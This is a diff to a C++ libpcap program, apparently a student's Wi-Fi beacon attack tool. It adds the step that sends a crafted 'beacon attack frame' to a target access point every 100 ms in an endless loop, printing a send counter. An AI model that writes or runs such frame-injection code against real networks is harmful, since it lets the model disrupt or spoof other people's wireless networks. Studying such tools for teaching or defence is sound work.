@@ -53,11 +53,6 @@ int main(int argc, char* argv[])
     if(!parse(&param, argc, argv)) return -1;
 
     ST_MAC ap_mac = macFromArgv(argv[2]);
-    /*
-        printf("%02X:%02X:%02X:%02X:%02X:%02X\n",
-        ap_mac.mac[0], ap_mac.mac[1], ap_mac.mac[2],
-        ap_mac.mac[3], ap_mac.mac[4], ap_mac.mac[5]);
-    */
     ST_MAC st_mac = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -68,6 +63,7 @@ int main(int argc, char* argv[])
         return -1;
     }
 
+    int sendCount = 1;
     while(true)
     {
         // phase 1: beacon frame capture
@@ -109,9 +105,22 @@ int main(int argc, char* argv[])
         // header->caplen을 패킷에서 찾는건줄 알았으나, 와이어샤크에서 pcap 파일을 수정 후 열때 문제인 것 같아 pass
 
         // phase 3: send beacon attack frame
-        
+        res = pcap_sendpacket(pcap, newPacket, newPacketLen);
+        if(res != 0)
+        {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+            return -1;
+        }
 
+        printf("target: ");
+        printf("%02X:%02X:%02X:%02X:%02X:%02X",
+                ap_mac.mac[0], ap_mac.mac[1], ap_mac.mac[2],
+                ap_mac.mac[3], ap_mac.mac[4], ap_mac.mac[5]);
+        printf("     send packet [%d]\n", sendCount);
+        sendCount ++;
+        if (sendCount == 1000) sendCount = 999;
         delete[] newPacket;
+        usleep(100000);
     }
 
     pcap_close(pcap);
